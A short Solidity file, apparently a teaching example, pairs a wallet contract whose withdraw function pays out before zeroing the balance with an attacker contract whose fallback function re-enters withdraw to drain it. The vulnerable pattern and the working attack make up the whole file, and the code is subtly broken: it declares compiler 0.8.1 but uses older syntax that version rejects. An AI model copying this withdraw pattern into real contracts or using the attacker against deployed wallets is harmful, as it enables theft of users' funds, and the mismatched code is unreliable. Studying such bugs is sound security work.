pragma solidity 0.8.1;

contract ReentrantWallet {

    mapping(address => uint256) balances;


    function withdraw() external {
        uint256 amount = balances[msg.sender];

        require(msg.sender.call.value(amount)());

        balances[msg.sender] = 0;
    }

}



contract Attacker {

    ReentrantWallet target = 0x0;

    constructor(address _target) {
        target = ReentrantWallet(_target);
    }

    function() payable {
        target.withdraw();
    }

}